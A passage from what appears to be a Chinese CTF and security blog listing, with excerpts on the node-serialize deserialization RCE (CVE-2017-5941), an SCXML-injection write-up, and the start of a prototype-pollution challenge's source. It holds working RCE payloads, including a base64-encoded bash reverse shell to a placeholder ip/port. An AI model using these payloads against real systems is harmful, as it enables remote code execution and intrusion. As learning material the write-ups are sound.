								<div class="date">post @ 2024-01-10
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>CVE-2017-5941  漏洞出现在node-serialize模块0.0.4版本当中   反序列化时执行eval并且参数可控 存在RCE</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><code>npm install node-serialize@0.0.4</code></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><p>了解什么是IIFE：</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p>
<p>IIFE一般写成下面的形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123; /* code */ &#125;());</span><br><span class="line">// 或者</span><br><span class="line">(function()&#123; /* code */ &#125;)();</span><br></pre></td></tr></table></figure>

<h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><p>先看到序列化结果</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line">    <span class="string">&quot;rce&quot;</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls /&#x27;</span>).<span class="title function_">toString</span>())&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> srl = serialize.<span class="title function_">serialize</span>(test);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(srl);</span><br><span class="line"><span class="comment">// &#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString())&#125;&quot;&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><p>unserialize反序列化代码逻辑</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">unserialize</span> = <span class="keyword">function</span>(<span class="params">obj, originObj</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> isIndex;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    obj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(obj);</span><br><span class="line">    isIndex = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  originObj = originObj || obj;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> circularTasks = [];</span><br><span class="line">  <span class="keyword">var</span> key;</span><br><span class="line">  <span class="keyword">for</span>(key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span>(obj.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">        obj[key] = <span class="built_in">exports</span>.<span class="title function_">unserialize</span>(obj[key], originObj);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(obj[key].<span class="title function_">indexOf</span>(<span class="variable constant_">FUNCFLAG</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">          obj[key] = <span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + obj[key].<span class="title function_">substring</span>(<span class="variable constant_">FUNCFLAG</span>.<span class="property">length</span>) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(obj[key].<span class="title function_">indexOf</span>(<span class="variable constant_">CIRCULARFLAG</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">          obj[key] = obj[key].<span class="title function_">substring</span>(<span class="variable constant_">CIRCULARFLAG</span>.<span class="property">length</span>);</span><br><span class="line">          circularTasks.<span class="title function_">push</span>(&#123;<span class="attr">obj</span>: obj, <span class="attr">key</span>: key&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isIndex) &#123;</span><br><span class="line">    circularTasks.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">task</span>) &#123;</span><br><span class="line">      task.<span class="property">obj</span>[task.<span class="property">key</span>] = <span class="title function_">getKeyPath</span>(originObj, task.<span class="property">obj</span>[task.<span class="property">key</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>17# eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code> </p>
<p>这里<code>FUNCFLAG=_$$ND_FUNC$$_</code> 也就是如果反序列化时如果识别为函数  则会直接拼接function部分 并eval     那么我们只要构造类似<code>eval(&#39;(function()&#123;console.log(2)&#125;)&#39;)</code> 即可执行</p>
<h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h3><p>在序列化结果末尾添上<code>()</code>  然后反序列化</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(require(\&#x27;child_process\&#x27;).execSync(\&#x27;ls /\&#x27;).toString())&#125;()&quot;&#125;&#x27;</span>;</span><br><span class="line">serialize.<span class="title function_">unserialize</span>(payload);</span><br><span class="line"><span class="comment">// 成功执行ls /</span></span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/2024/01/10/node反序列化RCE/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2024/01/04/HNCTF2023-BabyJxVx-wp/" >HNCTF2023-BabyJxVx-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2024-01-04
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3781">题目链接</a>  </p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>下载附件后得到<code>BabyJxVx.jar</code>  反编译后查看代码逻辑</p>
<p><code>com.example.babyjxvx.FlagController</code>中有</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/Flag&quot;&#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">Flag</span><span class="params">(<span class="meta">@RequestParam(required = true)</span> String filename)</span> &#123;</span><br><span class="line">    <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (check(filename).booleanValue()) &#123;</span><br><span class="line">            <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(filename);</span><br><span class="line">            executor.setStateMachine(scxml);</span><br><span class="line">            executor.go();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Revenge to me!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;revenge?&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">        System.out.println(var5);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;revenge?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即在<code>/Flag</code>路由下接收参数<code>filename</code>并用<code>SCXMLReader</code>读取文件</p>
<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">final</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onexit</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">assign</span> <span class="attr">location</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onexit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">final</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot; initial=&quot;run&quot;&gt;</code>：定义了一个 SCXML 状态机，其中 <code>xmlns</code>属性指定了命名空间，<code>version</code>属性指定了版本，<code>initial </code>属性指定了初始状态为 <code>run</code></li>
<li><code>&lt;final id=&quot;run&quot;&gt;</code>：定义了一个状态，它是最终状态，它的 <code>id </code>属性为 <code>run</code></li>
<li><code>&lt;onexit&gt;</code>：定义了一个事件，在退出状态时触发</li>
<li><code>&lt;assign........&gt; </code>： location 属性指定了要赋值的变量名称，expr 属性指定了要赋给变量的值。</li>
<li><code>YmFzaCAtaSA+JiAvZGV2L3RjcC81aTc4MTk2M3AyLnlpY3AuZnVuLzU4MjY1IDA+JjE=</code> base64解码后为 <code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>即reverse shell</li>
</ul>
<p>类似payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">onentry</span>&gt;</span> </span><br><span class="line">			<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">				<span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">			</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">cond</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">datamodel</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">data</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">datamodel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parallel</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">invoke</span> <span class="attr">src</span>=<span class="string">&quot;test&quot;</span> <span class="attr">content</span>=<span class="string">&quot;test&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span> </span><br><span class="line">    		<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;/<span class="name">invoke</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parallel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">history</span> <span class="attr">src</span>=<span class="string">&quot;test&quot;</span> <span class="attr">content</span>=<span class="string">&quot;test&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span></span><br><span class="line">    		<span class="tag">&lt;<span class="name">transition</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">cond</span>=<span class="string">&quot;&#x27;&#x27;.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;/<span class="name">history</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>将payload.xml 放置在vps上 并开启端口监听</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;http://node4.anna.nssctf.cn:28742/Flag?filename=http://xx.xx.xx.xx/pld.xml&#x27;</span></span><br><span class="line"><span class="comment">// 回显Revenge to me!   因为RCE执行结果不会回显 所以用reverse shell</span></span><br></pre></td></tr></table></figure>

<p>成功获取shell后<code>cat /f*</code></p>

	
	</div>
  <a type="button" href="/2024/01/04/HNCTF2023-BabyJxVx-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/12/28/HGAME2023-SharedDiary-wp/" >HGAME2023-SharedDiary-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-12-28
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3527">题目链接</a>  </p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="comment">// Prevent prototype pollution</span></span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Detected Prototype Pollution&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;./views&quot;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">randomize</span>(<span class="string">&#x27;aA0&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="comment">// save userinfo to session</span></span><br><span class="line">        <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Don&#x27;t pollution my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line">        <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">        user.<span class="property">password</span> = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">password</span>=== <span class="string">&quot;testpassword&quot;</span>) &#123;</span><br><span class="line">            user.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;login&quot;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;Login as admin or don&#x27;t touch my shared diary!&quot;</span>&#125;)</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">data</span> || !req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">username</span> || req.<span class="property">session</span>.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> diary = ejs.<span class="title function_">render</span>(<span class="string">`&lt;div&gt;<span class="subst">$&#123;req.body.diary&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        